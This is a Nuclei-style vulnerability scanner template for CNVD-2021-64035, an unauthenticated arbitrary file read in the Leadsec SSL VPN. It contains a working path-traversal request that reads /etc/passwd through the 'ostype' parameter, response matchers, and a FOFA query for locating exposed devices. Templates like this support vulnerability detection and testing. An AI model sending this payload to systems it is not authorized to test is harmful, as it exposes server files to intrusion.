id: CNVD-2021-64035

info:
  name: 网御星云 Leadsec SSL VPN 任意文件读取漏洞（CNVD-2021-64035）
  author: xiaoWangSec
  severity: high
  description: |
    网御星云 Leadsec SSL VPN 存在任意文件读取风险，攻击者可未授权读取服务器本地敏感文件。模板通过发起读取请求并匹配 `/etc/passwd` 内容及特定响应头确认漏洞。
  reference:
    - https://avd.aliyun.com/detail?id=AVD-2021-888761
    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-64035
  metadata:
    verified: true
    max-request: 1
    fofa-query: icon_hash="-15980305"
  tags: cnvd,cnvd2024,lfi,leadsec,vpn,vuln

http:
  - raw:
      - |
        GET /vpn/user/download/client?ostype=../../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - "appframe"

      - type: status
        status:
          - 200
